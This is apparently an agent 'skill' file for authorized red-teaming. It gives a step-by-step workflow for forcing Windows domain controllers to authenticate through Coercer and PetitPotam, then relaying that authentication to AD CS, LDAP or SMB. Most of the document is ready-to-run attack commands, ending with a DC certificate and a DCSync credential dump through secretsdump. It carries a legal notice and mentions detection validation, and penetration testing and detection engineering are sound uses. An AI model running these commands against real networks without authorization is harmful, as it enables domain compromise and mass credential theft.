---
name: coercing-authentication-with-coercer-petitpotam
description: Trigger machine account authentication with PetitPotam (MS-EFSR) and Coercer (MS-RPRN, MS-DFSNM, MS-FSRVP, MS-EVEN) via Coercer's scan/coerce/fuzz modes, feeding the coerced NTLM auth into a relay against AD CS Web Enrollment (ESC8), LDAP (RBCD), or SMB. Use when completing a coercion-relay chain against a Domain Controller in authorized engagements, or to validate coercion detections and signing/EPA mitigations. Do not use for relaying the coerced NTLM authentication into AD CS web enrollment ESC8 with ntlmrelayx - use relaying-ntlm-for-adcs-esc8.
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- active-directory
- coercion
- petitpotam
- coercer
- ntlm-relay
- esc8
- forced-authentication
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1187
---
# Coercing Authentication with Coercer and PetitPotam

> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Authentication coercion combined with NTLM relay can yield domain compromise. Use only against systems you own or have explicit written authorization to test. Unauthorized use is illegal.

## Overview

Many Windows RPC interfaces expose methods that take a UNC path and cause the receiving server to authenticate to that path using its **machine account**. An attacker who can reach these interfaces can force a target (commonly a Domain Controller) to authenticate to an attacker-controlled host. On its own this is "Forced Authentication"; combined with an **NTLM relay**, the coerced machine credential is relayed to a service that does not enforce signing/EPA, most famously AD CS Web Enrollment (**ESC8**), yielding a certificate for the Domain Controller and ultimately domain compromise.

**PetitPotam** (Gilles Lionel / topotam) abuses the MS-EFSR (Encrypting File System Remote Protocol) `EfsRpcOpenFileRaw` / `EfsRpcEncryptFileSrv` methods. **Coercer** (p0dalirius) generalizes the technique: it is a Python tool that automatically coerces a Windows server to authenticate to an arbitrary machine through 12 methods spanning multiple protocols — MS-EFSR (PetitPotam), MS-RPRN (PrinterBug/SpoolSample), MS-DFSNM (DFSCoerce), MS-FSRVP (ShadowCoerce), MS-EVEN, and more. Coercer operates in three modes: **scan** (probe which RPC methods are reachable/coercible), **coerce** (trigger authentication), and **fuzz** (research path variations). Sources: [p0dalirius/Coercer](https://github.com/p0dalirius/Coercer), [topotam/PetitPotam](https://github.com/topotam/PetitPotam), [The Hacker Recipes — Forced Authentications](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications).

## When to Use

- To complete an ESC8/ESC11 chain by forcing a DC to authenticate to a relay
- To trigger machine authentication for NTLM relay to LDAP (RBCD) or SMB
- When a relay target is identified but no inbound authentication is occurring naturally
- During detection engineering to generate coercion telemetry for blue-team tuning
- To validate that DCs/servers are patched and that relay mitigations (signing/EPA) hold

## Prerequisites

- Authorized scope including coercion and NTLM relay techniques
- Valid (often low-privileged) domain credentials; some methods work unauthenticated against unpatched hosts
- A relay listener (Certipy `relay` or Impacket `ntlmrelayx`) on a reachable host
- Network reachability to the target's RPC endpoints (135 + dynamic, 445)
- Linux attack host with Python 3.8+; install the tools:
  ```bash
  # Coercer
  pipx install coercer        # or: sudo python3 -m pip install coercer
  coercer --help
  # PetitPotam (source)
  git clone https://github.com/topotam/PetitPotam
  # Impacket (provides ntlmrelayx, dFSCoerce etc.)
  pipx install impacket
  ```

## Objectives

- Identify which RPC coercion methods a target exposes (scan mode)
- Stand up an NTLM relay pointed at a vulnerable service (e.g., AD CS web enrollment)
- Coerce the target machine account to authenticate to the relay
- Obtain a relayed artifact (DC certificate via ESC8, RBCD write via LDAP)
- Document coercible methods and recommend patching/mitigations

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1187 | Forced Authentication | Using MS-EFSR/MS-RPRN/MS-DFSNM/MS-FSRVP RPC methods to force a target machine account to authenticate to an attacker-controlled host |

Chained techniques: T1557.001 (LLMNR/NBT-NS Poisoning and SMB/NTLM Relay) and T1649 (Steal or Forge Authentication Certificates) when relayed into AD CS.

## Workflow

### Step 1: Scan the target for coercible methods
Use Coercer's scan mode to enumerate which RPC methods on the target can be leveraged. This identifies the best coercion vector without firing a full attack.

```bash
coercer scan -u 'attacker' -p 'Passw0rd!' -d corp.local \
    -t 10.0.0.10 -l 10.0.0.50
```
`-t` is the target (e.g., the DC), `-l` is the listener IP that should receive the coerced authentication.

### Step 2: Stand up the relay (ESC8 example)
In a separate terminal, start the relay aimed at AD CS web enrollment so any relayed DC authentication yields a DomainController certificate.

```bash
# Certipy relay into HTTP web enrollment (ESC8)
certipy relay -target 'http://CA.CORP.LOCAL' -template 'DomainController'

# Alternative: Impacket ntlmrelayx
impacket-ntlmrelayx -t http://CA.CORP.LOCAL/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController
```

### Step 3: Coerce authentication with Coercer
Trigger the target machine account to authenticate to the relay/listener. `--always-continue` tries every method until one succeeds.

```bash
coercer coerce -u 'attacker' -p 'Passw0rd!' -d corp.local \
    -t 10.0.0.10 -l 10.0.0.50 --always-continue
```
To use a single specific method (quieter), filter by method name:
```bash
coercer coerce -u 'attacker' -p 'Passw0rd!' -d corp.local \
    -t 10.0.0.10 -l 10.0.0.50 --filter-method-name PetitPotam
```

### Step 4: Coerce with PetitPotam directly (MS-EFSR)
PetitPotam is the canonical MS-EFSR coercion and works unauthenticated against unpatched DCs. Syntax: `petitpotam.py <listener> <target>`.

```bash
# Unauthenticated attempt
python3 PetitPotam.py 10.0.0.50 10.0.0.10
# Authenticated (more reliable on patched-but-vulnerable hosts)
python3 PetitPotam.py -u attacker -p 'Passw0rd!' -d corp.local 10.0.0.50 10.0.0.10
```

### Step 5: Use the relayed result
For ESC8, the relay writes a DC certificate (`dc.pfx`). Authenticate as the DC and DCSync.

```bash
certipy auth -pfx 'dc$.pfx' -dc-ip 10.0.0.100
# Then DCSync with the recovered DC credential
impacket-secretsdump -k -no-pass 'corp.local/dc$@dc.corp.local' -just-dc
```

### Step 6: Relay to LDAP for RBCD (alternative chain)
If ESC8 is unavailable, relay coerced auth to LDAP to configure Resource-Based Constrained Delegation.

```bash
# Relay to LDAP and delegate to attacker-controlled computer account
impacket-ntlmrelayx -t ldap://dc.corp.local --delegate-access \
    --escalate-user 'attacker$' -smb2support
# Then coerce as in Step 3
```

### Step 7: Fuzz mode for unpatched-path discovery (research)
Fuzz mode varies UNC paths to find coercion paths bypassing partial patches.

```bash
coercer fuzz -u 'attacker' -p 'Passw0rd!' -d corp.local \
    -t 10.0.0.10 -l 10.0.0.50
```

## Tools and Resources

| Resource | Purpose | Link |
|----------|---------|------|
| Coercer | Multi-method automated coercion (12 methods) | https://github.com/p0dalirius/Coercer |
| PetitPotam | MS-EFSR coercion | https://github.com/topotam/PetitPotam |
| Certipy relay | ESC8/ESC11 relay target | https://github.com/ly4k/Certipy |
| Impacket ntlmrelayx | Relay to AD CS / LDAP / SMB | https://github.com/fortra/impacket |
| The Hacker Recipes | Coercion & relay theory | https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications |

## Coercion Method Reference

| Method | Protocol | Notes |
|--------|----------|-------|
| PetitPotam | MS-EFSR | EfsRpcOpenFileRaw / EfsRpcEncryptFileSrv; classic ESC8 trigger |
| PrinterBug / SpoolSample | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx; needs Spooler |
| DFSCoerce | MS-DFSNM | NetrDfsAddStdRoot; often works post-PetitPotam patch |
| ShadowCoerce | MS-FSRVP | IsPathSupported / IsPathShadowCopied |
| Others (Coercer) | MS-EVEN, etc. | 12 methods total; use `scan` to enumerate |

## Validation Criteria

- [ ] Coercer scan identified at least one reachable coercion method on the target
- [ ] Relay listener stood up against a confirmed vulnerable service
- [ ] Target machine account successfully coerced to authenticate to the listener
- [ ] Relayed artifact obtained (DC certificate, RBCD write, or SMB exec)
- [ ] (ESC8) DC certificate used to authenticate and DCSync demonstrated
- [ ] Coercible methods documented with affected host and patch recommendation
- [ ] Relay mitigations (SMB/LDAP signing, EPA, RPC filters) validated or flagged
